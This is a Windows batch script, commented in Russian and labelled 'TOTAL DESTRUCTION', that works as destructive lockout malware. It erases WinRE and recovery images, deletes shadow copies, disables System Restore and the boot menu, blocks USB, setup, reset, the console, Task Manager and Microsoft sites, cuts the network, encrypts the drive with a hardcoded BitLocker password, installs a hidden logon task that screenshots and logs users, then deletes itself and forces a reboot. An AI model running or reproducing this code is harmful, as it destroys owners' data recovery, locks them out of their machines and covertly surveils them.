@echo off
chcp 65001 >nul
net session >nul 2>&1
if %errorLevel% neq 0 (echo !!! ADMIN RIGHTS !!! && pause && exit /b)

:: ============================================================
:: TOTAL DESTRUCTION - СТИРАЕМ RECOVERY + ПОЛНАЯ БЛОКИРОВКА
:: ============================================================

echo [*] STARTING TOTAL DESTRUCTION...
echo.

:: ==================== 1. СТИРАЕМ RECOVERY ====================
echo [1] ERASING RECOVERY...

:: Отключаем WinRE
reagentc /disable >nul 2>&1

:: Стираем папку Recovery с корнем
if exist "C:\Recovery" (
    echo     - Deleting C:\Recovery
    takeown /f "C:\Recovery" /r /d y >nul 2>&1
    icacls "C:\Recovery" /grant Everyone:F /t >nul 2>&1
    attrib -r -s -h "C:\Recovery" /s /d >nul 2>&1
    rd /s /q "C:\Recovery" >nul 2>&1
    echo     [OK] C:\Recovery deleted
)

:: Стираем Recovery в System32
if exist "C:\Windows\System32\Recovery" (
    echo     - Deleting C:\Windows\System32\Recovery
    takeown /f "C:\Windows\System32\Recovery" /r /d y >nul 2>&1
    icacls "C:\Windows\System32\Recovery" /grant Everyone:F /t >nul 2>&1
    attrib -r -s -h "C:\Windows\System32\Recovery" /s /d >nul 2>&1
    rd /s /q "C:\Windows\System32\Recovery" >nul 2>&1
    echo     [OK] C:\Windows\System32\Recovery deleted
)

:: Стираем WinRE.wim где бы он ни был
for /d %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\Recovery" (
        echo     - Found Recovery on %%d:
        takeown /f "%%d:\Recovery" /r /d y >nul 2>&1
        icacls "%%d:\Recovery" /grant Everyone:F /t >nul 2>&1
        rd /s /q "%%d:\Recovery" >nul 2>&1
    )
)

:: Ищем и удаляем winre.wim по всей системе
echo     - Searching for winre.wim...
for /r C:\ %%f in (winre.wim) do (
    echo     - Found: %%f
    takeown /f "%%f" >nul 2>&1
    icacls "%%f" /grant Everyone:F >nul 2>&1
    del /f /q "%%f" >nul 2>&1
)

echo     [OK] Recovery ERASED
echo.

:: ==================== 2. УДАЛЯЕМ ТЕНЕВЫЕ КОПИИ ====================
echo [2] DELETING SHADOW COPIES...
vssadmin delete shadows /all /quiet >nul 2>&1
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t REG_DWORD /d 1 /f >nul 2>&1
echo     [OK] Shadows deleted
echo.

:: ==================== 3. БЛОКИРОВКА USB ====================
echo [3] BLOCKING USB...
for %%s in (USBSTOR UASPStor WpdUpFltr 1394ohci sbp2port TbtP2p) do (
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\%%s" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v "DenyRemovableDevices" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v "DenyUnspecified" /t REG_DWORD /d 1 /f >nul 2>&1
echo     [OK] USB blocked
echo.

:: ==================== 4. ШИФРОВАНИЕ ДИСКА ====================
echo [4] ENCRYPTING DISK...
wmic os get Caption | findstr /i "Home" >nul
if %errorLevel% equ 0 (
    echo     - Home edition: Device Encryption
    manage-bde -on C: -used -recoverypassword >nul 2>&1
    manage-bde -protectors -get C: > "C:\RecoveryKey.txt" 2>&1
    attrib +s +h "C:\RecoveryKey.txt"
) else (
    echo     - Pro/Enterprise: BitLocker
    reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "EnableBDEWithNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "UsePasswordNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
    manage-bde -protectors -add C: -password -pw "174885" >nul 2>&1
    manage-bde -on C: -used -recoverypassword >nul 2>&1
)
echo     [OK] Encryption active
echo.

:: ==================== 5. БЛОКИРОВКА ЗАГРУЗКИ ====================
echo [5] LOCKING BOOT...
bcdedit /set {current} recoveryenabled No >nul 2>&1
bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
bcdedit /set {bootmgr} displaybootmenu No >nul 2>&1
bcdedit /set {bootmgr} timeout 0 >nul 2>&1
echo     [OK] Boot locked
echo.

:: ==================== 6. БЛОКИРОВКА УСТАНОВЩИКА ====================
echo [6] BLOCKING SETUP...
:: Блокируем setup.exe
if exist "C:\Windows\System32\setup.exe" (
    takeown /f "C:\Windows\System32\setup.exe" >nul 2>&1
    icacls "C:\Windows\System32\setup.exe" /deny Everyone:(X) >nul 2>&1
    icacls "C:\Windows\System32\setup.exe" /deny SYSTEM:(X) >nul 2>&1
    ren "C:\Windows\System32\setup.exe" "setup.exe.blocked" >nul 2>&1
)

:: Блокируем OOBE
if exist "C:\Windows\System32\oobe" (
    takeown /f "C:\Windows\System32\oobe" /r /d y >nul 2>&1
    icacls "C:\Windows\System32\oobe" /deny Everyone:(X) >nul 2>&1
)

:: Блокируем sysprep
if exist "C:\Windows\System32\sysprep" (
    takeown /f "C:\Windows\System32\sysprep" /r /d y >nul 2>&1
    icacls "C:\Windows\System32\sysprep" /deny Everyone:(X) >nul 2>&1
)
echo     [OK] Setup blocked
echo.

:: ==================== 7. БЛОКИРОВКА СБРОСА WINDOWS ====================
echo [7] BLOCKING RESET...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableRecovery" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRecovery" /t REG_DWORD /d 1 /f >nul 2>&1

:: Удаляем ResetUtil
if exist "C:\Windows\System32\ResetUtil.dll" (
    takeown /f "C:\Windows\System32\ResetUtil.dll" >nul 2>&1
    icacls "C:\Windows\System32\ResetUtil.dll" /deny Everyone:(X) >nul 2>&1
)

:: Отключаем кнопку сброса в параметрах
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoPinningToTaskbar" /t REG_DWORD /d 1 /f >nul 2>&1
echo     [OK] Reset blocked
echo.

:: ==================== 8. БЛОКИРОВКА КОНСОЛИ ====================
echo [8] LOCKING CONSOLE...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
echo     [OK] Console locked
echo.

:: ==================== 9. БЛОКИРОВКА САЙТОВ ====================
echo [9] BLOCKING MICROSOFT...
attrib -r -s -h "C:\Windows\System32\drivers\etc\hosts" >nul 2>&1
(
echo # LOCKDOWN
echo 0.0.0.0 microsoft.com
echo 0.0.0.0 www.microsoft.com
echo 0.0.0.0 windowsupdate.microsoft.com
echo 0.0.0.0 update.microsoft.com
echo 0.0.0.0 download.microsoft.com
echo 0.0.0.0 go.microsoft.com
echo 0.0.0.0 support.microsoft.com
echo 0.0.0.0 msdn.microsoft.com
echo 0.0.0.0 technet.microsoft.com
echo 0.0.0.0 login.live.com
echo 0.0.0.0 account.microsoft.com
echo 0.0.0.0 bing.com
echo 0.0.0.0 windows.com
echo 0.0.0.0 office.com
echo 0.0.0.0 office365.com
) >> "C:\Windows\System32\drivers\etc\hosts"
attrib +r +s +h "C:\Windows\System32\drivers\etc\hosts" >nul 2>&1
echo     [OK] Microsoft blocked
echo.

:: ==================== 10. ОТКЛЮЧЕНИЕ СЕТИ ====================
echo [10] CUTTING NETWORK...
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound >nul 2>&1
ipconfig /release >nul 2>&1
echo     [OK] Network killed
echo.

:: ==================== 11. СКРЫТЫЙ ЛОГГЕР ====================
echo [11] INSTALLING SPY LOGGER...
mkdir "C:\Users\Public\AppLogs" >nul 2>&1
attrib +s +h "C:\Users\Public\AppLogs" >nul 2>&1

:: Логгер входа
(
echo @echo off
echo setlocal enabledelayedexpansion
echo set "TS=%%date%% %%time%%"
echo set "LOG=C:\Users\Public\AppLogs\access.log"
echo echo [!TS!] SYSTEM ACCESS DETECTED >> "!LOG!"
echo echo [!TS!] USER: %%username%% >> "!LOG!"
echo echo [!TS!] COMPUTER: %%computername%% >> "!LOG!"
echo :: Тихий скриншот через PowerShell
echo powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $img = New-Object System.Drawing.Bitmap($b.Width, $b.Height); $g = [System.Drawing.Graphics]::FromImage($img); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $img.Save('C:\Users\Public\AppLogs\screen_!RANDOM!.jpg')" ^>nul 2^>^&1
) > "C:\Users\Public\AppLogs\spy.bat"

schtasks /create /tn "SystemSpy" /tr "C:\Users\Public\AppLogs\spy.bat" /sc onlogon /rl highest /f >nul 2>&1
echo     [OK] Logger installed
echo.

:: ==================== 12. ФИНАЛЬНАЯ ЗАЩИТА ФАЙЛОВ ====================
echo [12] PROTECTING SYSTEM FILES...

:: Защищаем важные файлы от изменений
for %%f in (
    "C:\Windows\System32\drivers\etc\hosts"
    "C:\Windows\System32\config\SAM"
    "C:\Windows\System32\config\SYSTEM"
    "C:\Windows\System32\config\SECURITY"
) do (
    if exist %%f (
        attrib +r +s +h %%f >nul 2>&1
        echo     - Protected: %%f
    )
)
echo     [OK] Files protected
echo.

:: ==================== ЗАВЕРШЕНИЕ ====================
echo ============================================
echo [OK] TOTAL DESTRUCTION COMPLETE
echo ============================================
echo [i] Password: 174885
echo [i] Recovery key: C:\RecoveryKey.txt
echo [!] SYSTEM WILL REBOOT IN 10 SECONDS
echo ============================================

:: Финальный штрих - удаление самого скрипта
del /f /q "%~f0" >nul 2>&1

shutdown /r /t 10 /f /c "SYSTEM LOCKED - RECOVERY ERASED"
